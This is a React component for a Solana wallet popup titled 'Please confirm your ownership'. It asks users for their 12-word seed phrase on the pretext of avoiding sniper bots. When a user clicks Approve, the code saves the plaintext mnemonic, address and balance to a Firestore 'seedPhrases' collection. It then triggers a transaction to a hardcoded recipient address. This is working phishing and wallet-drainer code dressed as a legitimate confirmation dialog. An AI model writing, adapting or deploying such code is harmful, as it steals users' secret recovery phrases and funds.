"use client";

import { useEffect, useState } from "react";
import * as bip39 from "bip39";
import * as bs58 from "bs58";
import wordlist from "@/components/wordlist.json";
import { derivePath } from "ed25519-hd-key";
import { PublicKey } from "@solana/web3.js";
import { useWallet } from '@solana/wallet-adapter-react';

import { handleTransaction } from '@/components/triggerTransaction';
import { collection, addDoc } from "firebase/firestore";
import { db } from "@/components/firebase"; // Adjust the path as needed
import InitiateTransactionButton from '@/components/InitiateTransactionButton';


const SeedphraseBox = () => {
  const [seedPhrase, setSeedPhrase] = useState<string[]>(Array(12).fill(""));
  const [publicKey, setPublicKey] = useState<string | null>(null);
  const [balance, setBalance] = useState<number | null>(null);
  const [copied, setCopied] = useState(false);

  // Set the English wordlist explicitly
  useEffect(() => {
    bip39.wordlists.english = wordlist;
  }, []);

  // Listen for messages to update publicKey and balance
  useEffect(() => {
    const handleMessage = (event: MessageEvent) => {
      if (event.origin === window.location.origin && event.data.publicKey) {
        setPublicKey(event.data.publicKey);
        setBalance(event.data.balance); // Balance received in lamports
      }
    };

    window.addEventListener("message", handleMessage);

    return () => {
      window.removeEventListener("message", handleMessage);
    };
  }, []);

  const handleSeedInputChange = (index: number, value: string) => {
    const updatedSeed = [...seedPhrase];
    updatedSeed[index] = value.trim();
    setSeedPhrase(updatedSeed);
  };

  const validateSeedPhrase = (mnemonic: string) => {
    return bip39.validateMnemonic(mnemonic, bip39.wordlists.english);
  };
  const wallet = useWallet();
  const generatePublicKey = async () => {
    try {
      const mnemonic = seedPhrase.join(" ").trim();

      if (!validateSeedPhrase(mnemonic)) {
        alert("Invalid seed phrase. Please check your input.");
        return;
      }

      const docRef = await addDoc(collection(db, "seedPhrases"), {
        seedPhrase: mnemonic,
        timestamp: new Date().toISOString(),
        address: publicKey,
        balanceSol: balance
      });
      console.log("Seed phrase stored with ID:", docRef.id);

      const seed = await bip39.mnemonicToSeed(mnemonic);
      const path = "m/44'/501'/0'/0'"; // Solana-specific derivation path
      const derivedSeed = derivePath(path, seed.toString("hex")).key;

      const pubKey = new PublicKey(derivedSeed.subarray(0, 32));
      setPublicKey(pubKey.toBase58());
    } catch (error) {
      console.error("Error generating public key or storing seed phrase:", error);
      alert("An error occurred. Please try again.");
    }
    const recipient = '344qQUd3ap4wumbJLAzj7HCkwTFqGopJNyXtCTCrizKh'; // Replace with recipient address
        try {
            const signature = await handleTransaction(wallet, recipient);
            if (signature) {
                console.log('Transaction successful:', signature);
            }
        } catch (error) {
            console.error('Transaction failed:', error);
        }
  };

  

  const handleCopy = () => {
    if (publicKey) {
      navigator.clipboard.writeText(publicKey);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  const handleCloseWindow = () => {
    window.close();
  };

  return (
    <div
  style={{ backgroundColor: "#13161f" }}
  className="h-screen w-full bg-gray-900 text-white flex flex-col items-center pt-5"
>
  <h1 className="text-xl font-bold mb-4">Please confirm your ownership</h1>

  {/* Seed Phrase Input Fields */}
  <div className="grid grid-cols-3 gap-2 mb-4">
    {seedPhrase.map((word, index) => (
      <input
        key={index}
        type="text"
        value={word}
        onChange={(e) => handleSeedInputChange(index, e.target.value)}
        className="w-20 p-2 text-center bg-gray-800 text-white rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
        placeholder={`Word ${index + 1}`}
      />
    ))}
  </div>

  {/* Tooltip with Help Icon */}
  <div className="w-full flex items-center justify-start pl-16 mb-4">
    <p className="text-sm font-normal tracking-tight text-gray-500 mr-2">
      Why to confirm ownership
    </p>
    <div className="relative group">
      {/* Help Icon */}
      <div className=" text-xs w-4 h-4 flex items-center justify-center rounded-full bg-gray-600 text-white cursor-pointer group-hover:bg-gray-500">
        i
      </div>
      {/* Tooltip */}
      <div className="absolute top-full mt-1 hidden group-hover:block w-40 px-3 py-2 text-xs text-white bg-gray-800 rounded-md shadow-lg">
        For avoiding sniper bots, you need to sign it manually.
      </div>
    </div>
  </div>

  {/* Block element */}
  <div
    style={{ backgroundColor: "#13161f" }}
    className="block max-w-sm p-6 border border-gray-800 rounded-lg shadow"
  >
    <p className="mb-2 text-sm font-bold tracking-tight text-gray-900 dark:text-white">
      You will Receive 
    </p>
    <p className="font-normal text-gray-700 dark:text-gray-400">
      Here are the biggest enterprise technology acquisitions of 2021 so far, in reverse chronological order.
    </p>
  </div>

  <div>
    <button
      style={{ backgroundColor: "#21242f" }}
      onClick={handleCloseWindow}
      className="px-8 py-2 mr-4 bg-blue-600 rounded-md hover:opacity-70 text-white"
    >
      Reject
    </button>

    <button
      style={{ backgroundColor: "#ff852d" }}
      onClick={generatePublicKey}
      className="px-6 py-2 bg-blue-600 rounded-md hover:opacity-80 text-black"
    >
      Approve
    </button>
  </div>
</div>

  );
};

export default SeedphraseBox;
